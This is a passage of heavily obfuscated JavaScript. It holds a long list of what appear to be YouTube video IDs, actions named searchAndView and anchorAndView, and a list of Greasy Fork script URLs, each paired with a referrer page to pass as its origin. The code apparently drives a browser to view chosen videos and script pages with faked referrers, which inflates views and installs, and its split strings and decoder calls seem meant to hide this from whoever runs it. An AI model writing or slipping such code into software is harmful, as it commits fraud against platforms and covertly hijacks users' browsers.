'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x32 * 0xb5 + 0x10ff + 0x1 * 0x125e);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    W(0x14) + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    V(0x10, '8m%I') + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    V(0x0, 'ovRg') + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    U(0x1) + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    W(0x9) + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + W(0x5) + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
